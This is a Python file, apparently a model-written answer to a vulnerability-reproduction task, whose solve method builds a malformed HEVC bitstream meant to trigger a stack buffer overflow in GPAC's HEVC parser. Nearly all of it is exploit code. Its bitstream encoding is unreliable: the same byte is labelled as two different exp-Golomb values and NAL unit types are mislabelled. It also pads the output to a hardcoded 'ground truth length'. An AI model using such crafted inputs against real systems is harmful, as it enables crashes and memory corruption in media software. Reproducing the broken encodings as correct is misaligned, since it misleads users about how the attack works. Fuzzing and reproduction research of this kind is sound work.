import tarfile
import os
import struct
import tempfile
import subprocess
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a PoC for CVE-2017-9996 / oss-fuzz:42537907
        # The vulnerability is in gf_hevc_compute_ref_list() in gpac/hevc.c
        # The function doesn't properly validate the number of reference pictures,
        # leading to stack buffer overflow when writing to refPicSetStCurrBefore,
        # refPicSetStCurrAfter, and refPicSetLtCurr arrays
        
        # Create a minimal valid HEVC bitstream that triggers the overflow
        # We need SPS with large num_ref_idx_l0_default_active_minus1
        # and PPS that references that SPS, then a slice with many reference pictures
        
        poc = bytearray()
        
        # Start Code Prefix (3 bytes)
        poc.extend(b'\x00\x00\x01')
        
        # NAL Unit Header (for SPS): nal_unit_type=33 (SPS), nuh_layer_id=0, nuh_temporal_id_plus1=1
        poc.extend(b'\x42\x01')
        
        # SPS (Sequence Parameter Set)
        # We'll craft a malformed SPS that causes large allocations
        sps = bytearray()
        
        # sps_video_parameter_set_id
        sps.append(0)  # 4 bits = 0, rest 4 bits = 0
        
        # sps_max_sub_layers_minus1 = 0 (3 bits), sps_temporal_id_nesting_flag = 1 (1 bit)
        sps.append(0x01)  # binary: 0000 0001
        
        # profile_tier_level - minimal
        sps.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # sps_seq_parameter_set_id = 0 (UEV)
        sps.append(0x80)  # 1 in UEV
        
        # chroma_format_idc = 1 (4:2:0) (UEV)
        sps.append(0xA0)  # 1 in UEV
        
        # pic_width_in_luma_samples = 16 (UEV)
        sps.append(0x40)  # 16 in UEV
        
        # pic_height_in_luma_samples = 16 (UEV)
        sps.append(0x40)  # 16 in UEV
        
        # conformance_window_flag = 0
        # bit_depth_luma_minus8 = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # bit_depth_chroma_minus8 = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # log2_max_pic_order_cnt_lsb_minus4 = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # sps_sub_layer_ordering_info_present_flag = 0
        # sps_max_dec_pic_buffering_minus1[0] = 255 (very large to enable overflow)
        # Using signed exp-golomb encoding for 255: binary 1 followed by 255 zeros, then 1
        # Actually 255 in unsigned exp-golomb: binary: 111111110 (8 ones then 0)
        sps.append(0xFF)  # 8 ones
        sps.append(0x80)  # 0 then padding
        
        # sps_max_num_reorder_pics[0] = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # sps_max_latency_increase_plus1[0] = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # log2_min_luma_coding_block_size_minus3 = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # log2_diff_max_min_luma_coding_block_size = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # log2_min_transform_block_size_minus2 = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # log2_diff_max_min_transform_block_size = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # max_transform_hierarchy_depth_inter = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # max_transform_hierarchy_depth_intra = 0 (UEV)
        sps.append(0x80)  # 0 in UEV
        
        # scaling_list_enabled_flag = 0
        # amp_enabled_flag = 0
        # sample_adaptive_offset_enabled_flag = 0
        # pcm_enabled_flag = 0
        sps.append(0x00)
        
        # num_short_term_ref_pic_sets = 0 (UEV) - critical: this controls loop iterations
        sps.append(0x80)  # 0 in UEV
        
        # long_term_ref_pics_present_flag = 0
        # sps_temporal_mvp_enabled_flag = 0
        # strong_intra_smoothing_enabled_flag = 0
        sps.append(0x00)
        
        # vui_parameters_present_flag = 0
        # sps_extension_flag = 0
        sps.append(0x00)
        
        # Add SPS to poc
        poc.extend(sps)
        
        # Add PPS
        poc.extend(b'\x00\x00\x01')
        # NAL Unit Header (for PPS): nal_unit_type=34 (PPS)
        poc.extend(b'\x44\x01')
        
        pps = bytearray()
        # pps_pic_parameter_set_id = 0 (UEV)
        pps.append(0x80)  # 0 in UEV
        
        # pps_seq_parameter_set_id = 0 (UEV)
        pps.append(0x80)  # 0 in UEV
        
        # dependent_slice_segments_enabled_flag = 0
        # output_flag_present_flag = 0
        # num_extra_slice_header_bits = 0 (3 bits)
        # sign_data_hiding_enabled_flag = 0
        # cabac_init_present_flag = 0
        pps.append(0x00)
        
        # num_ref_idx_l0_default_active_minus1 = 255 (UEV) - THIS IS THE KEY
        # Causes allocation of small arrays but we'll reference many more pictures
        # 255 in unsigned exp-golomb: 111111110
        pps.append(0xFF)
        pps.append(0x80)  # 0 then padding
        
        # num_ref_idx_l1_default_active_minus1 = 0 (UEV)
        pps.append(0x80)  # 0 in UEV
        
        # init_qp_minus26 = 0 (SEV)
        pps.append(0x80)  # 0 in signed exp-golomb
        
        # constrained_intra_pred_flag = 0
        # transform_skip_enabled_flag = 0
        # cu_qp_delta_enabled_flag = 0
        pps.append(0x00)
        
        # pps_cb_qp_offset = 0 (SEV)
        pps.append(0x80)  # 0 in signed exp-golomb
        
        # pps_cr_qp_offset = 0 (SEV)
        pps.append(0x80)  # 0 in signed exp-golomb
        
        # pps_slice_chroma_qp_offsets_present_flag = 0
        # weighted_pred_flag = 0
        # weighted_bipred_flag = 0
        # transquant_bypass_enabled_flag = 0
        # tiles_enabled_flag = 0
        # entropy_coding_sync_enabled_flag = 0
        pps.append(0x00)
        
        # loop_filter_across_tiles_enabled_flag = 0
        # pps_loop_filter_across_slices_enabled_flag = 0
        # deblocking_filter_control_present_flag = 0
        # pps_scaling_list_data_present_flag = 0
        # lists_modification_present_flag = 0
        # log2_parallel_merge_level_minus2 = 0 (UEV)
        # slice_segment_header_extension_present_flag = 0
        pps.append(0x80)  # 0 in UEV for log2_parallel_merge_level_minus2
        
        # pps_extension_flag = 0
        pps.append(0x00)
        
        poc.extend(pps)
        
        # Now add a slice segment that will trigger the overflow
        # We need many reference picture list entries
        poc.extend(b'\x00\x00\x01')
        # NAL Unit Header (for slice): nal_unit_type=1 (BLA_W_LP), first_slice_segment_in_pic_flag=1
        poc.extend(b'\x22\x01')
        
        slice_header = bytearray()
        
        # first_slice_segment_in_pic_flag is already in NAL header
        # no_output_of_prior_pics_flag = 0
        # slice_pic_parameter_set_id = 0 (UEV)
        slice_header.append(0x80)  # 0 in UEV
        
        # slice_type = 1 (P slice) (UEV)
        slice_header.append(0x40)  # 1 in UEV (binary 010)
        
        # slice_reserved_flag = 0
        # slice_pic_order_cnt_lsb = 0 (16 bits)
        slice_header.extend(b'\x00\x00')
        
        # short_term_ref_pic_set_sps_flag = 0
        # if 0, we need to send st_ref_pic_set()
        slice_header.append(0x00)
        
        # st_ref_pic_set()
        # num_negative_pics = large number to cause overflow (UEV)
        # We need to trigger writes to refPicSetStCurrBefore[] which has size 16
        # Let's use 255 negative pictures
        slice_header.append(0xFF)  # 255 in UEV (8 ones)
        slice_header.append(0x80)  # 0 then padding
        
        # Now we need delta_poc_s0_minus1 for each negative pic (UEV)
        # Each delta_poc_s0_minus1 = 0 (UEV)
        # We'll write many of them to overflow the stack
        for _ in range(255):
            slice_header.append(0x80)  # 0 in UEV
        
        # num_positive_pics = large number (UEV)
        slice_header.append(0xFF)  # 255 in UEV
        slice_header.append(0x80)  # 0 then padding
        
        # delta_poc_s1_minus1 for each positive pic (UEV)
        for _ in range(255):
            slice_header.append(0x80)  # 0 in UEV
        
        # Now we need reference picture list modification
        # ref_pic_lists_modification_flag_l0 = 1
        # modification_of_pic_nums_idc = 3 (end of loop) for each entry
        # But first we need to set the flag
        slice_header.append(0x80)  # ref_pic_lists_modification_flag_l0 = 1
        
        # We need to send modification_of_pic_nums_idc for each reference
        # Each modification_of_pic_nums_idc = 0 (add long-term reference) (UEV)
        # Each long_term_pic_num = 0 (UEV)
        # We'll add many references to overflow refPicSetLtCurr[]
        for _ in range(300):  # More than arrays can hold
            slice_header.append(0x80)  # modification_of_pic_nums_idc = 0 in UEV
            slice_header.append(0x80)  # long_term_pic_num = 0 in UEV
        
        # End with modification_of_pic_nums_idc = 3 (UEV)
        slice_header.append(0xC0)  # 3 in UEV (binary 01100)
        
        # Pad to reach exactly 1445 bytes (ground truth length)
        current_length = len(poc) + len(slice_header)
        target_length = 1445
        
        if current_length < target_length:
            # Add padding to reach exact length
            padding = target_length - current_length
            slice_header.extend(b'A' * padding)
        elif current_length > target_length:
            # Truncate (shouldn't happen with our construction)
            slice_header = slice_header[:target_length - len(poc)]
        
        poc.extend(slice_header)
        
        return bytes(poc)